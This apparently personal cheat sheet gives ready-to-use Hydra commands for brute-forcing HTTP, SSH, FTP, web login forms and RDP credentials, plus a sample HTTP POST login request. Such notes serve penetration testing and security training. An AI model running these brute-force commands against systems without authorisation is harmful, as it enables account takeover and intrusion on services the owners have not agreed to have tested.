# Hydra
- Can brute force FTP, SSH, HTTP, SMTP, POP3, IMAP, MYSQL, MSSQL, VNC, RDP:
- HTTP: `hydra -L usernames.txt -P passwords.txt www.example.com http-get`
- Multiple SSH servers: `hydra -l root -p toor -M targets.txt ssh`
- FTP on non-standard port: `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
- Web Login Form: `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
- RDP Brute-forcing: `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123

```

- The POST method indicates that data is being sent to the server to create or update a resource
